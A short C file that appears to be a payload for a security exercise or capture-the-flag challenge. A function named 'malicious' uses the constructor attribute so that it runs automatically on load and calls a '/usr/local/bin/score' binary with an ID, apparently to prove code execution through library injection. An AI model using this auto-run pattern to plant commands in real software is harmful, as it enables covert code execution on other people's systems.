#include<stdio.h>
#include<stdlib.h>

static void malicious() __attribute__((constructor));

void malicious() {
    system("/usr/local/bin/score 422acb85-639c-43db-b448-fccf64ece96f");
}
